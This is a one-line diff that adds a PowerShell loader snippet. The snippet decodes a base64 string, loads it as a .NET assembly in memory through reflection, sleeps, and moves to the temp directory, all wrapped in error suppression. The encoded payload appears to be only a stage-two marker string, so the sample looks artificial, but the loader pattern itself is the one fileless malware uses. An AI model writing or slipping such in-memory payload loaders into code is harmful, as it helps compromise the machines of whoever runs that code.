@@ -1,0 +1,1 @@
+<# Remote fetch #> try { $AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpxdGpvNG1jM2Nl"); Write-Verbose ("Assembly bytes: " + $AssemblyBytes.Length); [Reflection.Assembly]::Load($AssemblyBytes); Start-Sleep -Seconds 16; Set-Location -Path $env:TEMP } catch { Write-Warning "Loader step failed" }
